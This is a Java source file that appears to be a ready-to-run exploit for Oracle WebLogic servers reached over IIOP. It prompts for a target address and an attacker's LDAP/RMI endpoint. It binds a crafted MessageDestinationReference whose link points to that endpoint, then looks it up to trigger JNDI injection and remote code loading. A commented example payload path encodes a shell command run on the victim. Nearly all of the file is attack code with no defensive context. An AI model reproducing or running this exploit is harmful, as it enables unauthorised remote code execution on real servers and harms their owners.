import weblogic.j2ee.descriptor.InjectionTargetBean;
import weblogic.j2ee.descriptor.MessageDestinationRefBean;
import javax.naming.*;
import java.util.Scanner;
import java.util.Hashtable;
import java.util.Random;

public class MainClass {

    public static void main(String[] args) throws Exception {
	Scanner scanner = new Scanner(System.in);
	System.out.print("Target IP: ");
	String ip = scanner.nextLine();
	System.out.print("Target Port: ");
	String port = scanner.nextLine();
	System.out.print("RMI Address (ip:port/exp): ");
	String rmiexp = scanner.nextLine();
	Random bindname = new Random();
	int bindint = bindname.nextInt(10000);
//        String ip = "127.0.0.1";
//        String port = "7001";
//        String rmiexp = "192.168.0.103/cVLtcNoHML/Plain/Exec/eyJjbWQiOiJ0b3VjaCAvdG1wL3N1Y2Nlc3MxMjMifQ==";
        String rhost = String.format("iiop://%s:%s", ip, port);
        Hashtable<String, String> env = new Hashtable<String, String>();
        // add wlsserver/server/lib/weblogic.jar to classpath,else will error.
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put(Context.PROVIDER_URL, rhost);
        Context context = new InitialContext(env);
//        Reference reference = new Reference("weblogic.application.naming.MessageDestinationObjectFactory","weblogic.application.naming.MessageDestinationObjectFactory","");
        weblogic.application.naming.MessageDestinationReference messageDestinationReference=new weblogic.application.naming.MessageDestinationReference(null, new MessageDestinationRefBean() {
            @Override
            public String[] getDescriptions() {
                return new String[0];
            }

            @Override
            public void addDescription(String s) {

            }

            @Override
            public void removeDescription(String s) {

            }

            @Override
            public void setDescriptions(String[] strings) {

            }

            @Override
            public String getMessageDestinationRefName() {
                return null;
            }

            @Override
            public void setMessageDestinationRefName(String s) {

            }

            @Override
            public String getMessageDestinationType() {
                return "weblogic.application.naming.MessageDestinationReference";
            }

            @Override
            public void setMessageDestinationType(String s) {

            }

            @Override
            public String getMessageDestinationUsage() {
                return null;
            }

            @Override
            public void setMessageDestinationUsage(String s) {

            }

            @Override
            public String getMessageDestinationLink() {
                return null;
            }

            @Override
            public void setMessageDestinationLink(String s) {

            }

            @Override
            public String getMappedName() {
                return null;
            }

            @Override
            public void setMappedName(String s) {

            }

            @Override
            public InjectionTargetBean[] getInjectionTargets() {
                return new InjectionTargetBean[0];
            }

            @Override
            public InjectionTargetBean createInjectionTarget() {
                return null;
            }

            @Override
            public void destroyInjectionTarget(InjectionTargetBean injectionTargetBean) {

            }

            @Override
            public String getLookupName() {
                return null;
            }

            @Override
            public void setLookupName(String s) {

            }

            @Override
            public String getId() {
                return null;
            }

            @Override
            public void setId(String s) {

            }
        }, "ldap://" + rmiexp, null, null);

        context.bind("pthree"+bindint,messageDestinationReference);
        context.lookup("pthree"+bindint);
    }
}
